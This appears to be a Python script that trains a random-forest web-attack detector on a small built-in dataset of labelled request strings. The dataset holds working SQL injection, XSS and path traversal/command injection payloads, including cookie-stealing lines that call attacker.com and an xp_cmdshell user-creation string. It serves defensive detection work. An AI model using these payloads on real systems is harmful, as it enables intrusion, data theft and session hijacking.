import os
import sys
import joblib
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score

# Ensure stdout handles UTF-8 on Windows PowerShell
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

# ============================================================================
# 1. Comprehensive Payload Dataset for Web App Security
# Categories:
#   0: Benign (Clean Traffic)
#   1: SQL Injection (SQLi)
#   2: Cross-Site Scripting (XSS)
#   3: Path Traversal / Command Injection
# ============================================================================

DATASET = [
    # --- Benign Payloads (0) ---
    ("SELECT_ALL_PRODUCTS", "id=101&category=electronics&sort=asc&page=2", 0),
    ("BENIGN_SEARCH", "q=laptop+bags+under+50+dollars&filter=in_stock", 0),
    ("USER_PROFILE_UPDATE", '{"name": "John Doe", "email": "john.doe@example.com", "role": "developer"}', 0),
    ("LOGIN_FORM_CLEAN", "username=alice_smith&password=SecurePassword123!", 0),
    ("API_BEARER_AUTH", "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", 0),
    ("USER_AGENT_MOZILLA", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 0),
    ("CONTACT_FORM", "name=Sarah&message=Hello, I would like to inquire about enterprise pricing.", 0),
    ("JSON_SETTING_POST", '{"theme": "dark", "notifications": true, "volume": 80}', 0),
    ("GET_ARTICLE_PATH", "/api/v1/articles/2026/cybersecurity-trends-guide", 0),
    ("PAGINATION_QUERY", "limit=50&offset=150&filter_by=active", 0),
    ("CHECKOUT_CART", '{"cart_id": "c-9842", "items": [{"sku": "KB-100", "qty": 1}]}', 0),
    ("SEARCH_BLOG", "search=how+to+configure+nginx+reverse+proxy", 0),
    ("FEEDBACK_TEXT", "Great application! Smooth user interface and clear dashboard metrics.", 0),
    ("COOKIE_HEADER", "Cookie: session_id=s_9843a87f12e9b; theme=dark; lang=en-US", 0),

    # --- SQL Injection Payloads (1) ---
    ("SQLI_OR_1_1", "' OR '1'='1", 1),
    ("SQLI_OR_1_1_DASH", "admin' OR 1=1--", 1),
    ("SQLI_UNION_SELECT", "1' UNION SELECT null, username, password FROM users--", 1),
    ("SQLI_UNION_ALL", "1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables--", 1),
    ("SQLI_DROP_TABLE", "1; DROP TABLE admin_users; --", 1),
    ("SQLI_EXEC_XP", "'; EXEC xp_cmdshell('net user hacker P@ss /add')--", 1),
    ("SQLI_SLEEP_BENCHMARK", "1' AND SLEEP(5)--", 1),
    ("SQLI_BENCHMARK", "1 AND BENCHMARK(5000000,MD5(1))", 1),
    ("SQLI_OBFUSCATED_SELECT", "1'/**/UN/**/ION/**/SE/**/LECT/**/1,2,3--", 1),
    ("SQLI_HAVING_GROUP", "1' HAVING 1=1--", 1),
    ("SQLI_INSERT_ADMIN", "'; INSERT INTO users (user, pass) VALUES ('attacker', 'pwned');--", 1),
    ("SQLI_SUBSTRING", "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) > 64--", 1),
    ("SQLI_OR_TRUE", "username=' OR true--&password=foo", 1),
    ("SQLI_HEX_ENCODED", "0x27204f5220313d31202d2d", 1),

    # --- Cross-Site Scripting (XSS) Payloads (2) ---
    ("XSS_BASIC_SCRIPT", "<script>alert('XSS')</script>", 2),
    ("XSS_IMG_ONERROR", "<img src=x onerror=alert(document.cookie)>", 2),
    ("XSS_SVG_ONLOAD", "<svg/onload=alert('WebGuard_Pwned')>", 2),
    ("XSS_BODY_ONLOAD", "<body onload=alert(1)>", 2),
    ("XSS_IFRAME_JS", "<iframe src=\"javascript:alert('XSS')\"></iframe>", 2),
    ("XSS_JAVASCRIPT_URI", "javascript:eval(atob('YWxlcnQoMSk='))", 2),
    ("XSS_ONMOUSEOVER", "<div onmouseover=\"fetch('http://attacker.com/steal?c='+document.cookie)\">Hover</div>", 2),
    ("XSS_INPUT_AUTOFOCUS", "<input autofocus onfocus=alert(1)>", 2),
    ("XSS_SCRIPT_SRC", "<script src=\"http://malicious-domain.com/hook.js\"></script>", 2),
    ("XSS_EVENT_HANDLER", "<a href=\"#\" onclick=\"alert('XSS')\">Click Me</a>", 2),
    ("XSS_OBFUSCATED_CHARCODE", "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", 2),
    ("XSS_DOM_COOKIE_STEAL", "<img src=1 onerror=\"document.location='http://attacker.com/log?'+document.cookie\">", 2),

    # --- Path Traversal / Command Injection Payloads (3) ---
    ("PATH_ETC_PASSWD", "../../../../etc/passwd", 3),
    ("PATH_WIN_INI", "..\\..\\..\\windows\\win.ini", 3),
    ("PATH_NULL_BYTE", "../../../../etc/shadow%00", 3),
    ("PATH_DOTS_SLASH", "....//....//....//etc/passwd", 3),
    ("CMD_INJ_PIPE_CAT", "127.0.0.1 | cat /etc/passwd", 3),
    ("CMD_INJ_SEMICOLON_LS", "localhost; ls -la /var/www/html", 3),
    ("CMD_INJ_BACKTICKS", "test `id`", 3),
    ("CMD_INJ_AND_WHOAMI", "ping 127.0.0.1 && whoami", 3),
    ("PATH_PROC_SELF_ENV", "../../../proc/self/environ", 3),
    ("PATH_WEB_INF", "/WEB-INF/web.xml", 3),
]

def train_model():
    print("=" * 60)
    print("🌲 WebGuard Random Forest Model Training Script")
    print("=" * 60)

    texts = [item[1] for item in DATASET]
    labels = [item[2] for item in DATASET]

    # Multiply dataset for robust training size
    texts = texts * 20
    labels = labels * 20

    print(f"Total training payload samples: {len(texts)}")

    # 2. Extract Character N-Gram TF-IDF Features (n=2 to 5)
    vectorizer = TfidfVectorizer(
        analyzer="char",
        ngram_range=(2, 5),
        max_features=5000,
        sublinear_tf=True
    )
    X = vectorizer.fit_transform(texts)
    y = np.array(labels)

    # 3. Train Test Split
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )

    # 4. Train Random Forest Classifier
    rf_model = RandomForestClassifier(
        n_estimators=100,
        max_depth=25,
        random_state=42,
        n_jobs=-1
    )
    rf_model.fit(X_train, y_train)

    # 5. Evaluate Performance
    y_pred = rf_model.predict(X_test)
    accuracy = accuracy_score(y_test, y_pred)
    print(f"\n✅ Model Training Complete!")
    print(f"🎯 Random Forest Accuracy: {accuracy * 100:.2f}%\n")
    print("Classification Report:")
    print(classification_report(y_test, y_pred, target_names=["Benign", "SQLi", "XSS", "Path Traversal/Cmd"]))

    # 6. Save Model Artifacts
    models_dir = os.path.join(os.path.dirname(__file__), "models")
    os.makedirs(models_dir, exist_ok=True)

    vectorizer_path = os.path.join(models_dir, "vectorizer.joblib")
    model_path = os.path.join(models_dir, "rf_model.joblib")

    joblib.dump(vectorizer, vectorizer_path)
    joblib.dump(rf_model, model_path)

    print(f"💾 Saved Vectorizer to: {vectorizer_path}")
    print(f"💾 Saved Random Forest Model to: {model_path}")
    print("=" * 60)

if __name__ == "__main__":
    train_model()
